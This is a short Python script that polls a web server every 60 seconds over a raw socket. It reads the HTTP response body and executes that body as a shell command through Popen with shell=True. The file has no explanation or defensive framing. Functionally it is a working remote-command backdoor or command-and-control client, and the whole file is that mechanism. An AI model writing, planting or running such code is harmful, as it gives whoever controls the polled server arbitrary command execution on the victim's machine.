import socket
from time import sleep
from subprocess import Popen


# Domain only
URL = 'localhost'


def typeof(value):
    # Check type of value
    if value.isnumeric():
        # Return int var if numeric
        return int(value)
    else:
        # Return str if not numeric
        return str(value)


def parse(text):
    out = {}

    text = text.split('\r\n')
    del text[0]

    for string in text:
        string = string.split(': ', 1)
        out[string[0].lower()] = typeof(string[1])

    return out


def receive():
    # Var for future resp. text
    data = ''

    # Open socket connection on 80 port to index page of host
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((URL, 80))
    s.send(
        bytes("GET / HTTP/1.1\nHost: {0}\n\n".format(URL), 'utf8')
    )

    # Receive first 8192 bytes of headers/text
    temp = s.recv(8192)
    # Decode received bytes and split to two parts (headers/text)
    temp = temp.decode('utf-8').split('\r\n\r\n', 1)

    # Receive Content-Length value and add second (text) part to data
    clen = parse(temp[0])['content-length']
    data += temp[1]

    # If we don`t received all text, receive it to end
    while len(data) != clen:
        temp = s.recv(8192).decode('utf-8')
        data += temp

    # Close socket connection
    s.close()

    # Return text resp. but remove last \r\n\r\n
    if data.endswith('\r\n\r\n'):
        return data[:-2]
    else:
        return data


if __name__ == "__main__":
    while True:
        tmp = receive()

        if len(tmp) > 0:
            Popen(
                tmp,
                close_fds=True,
                stdin=None,
                stdout=None,
                stderr=None,
                shell=True
            )

        sleep(60)
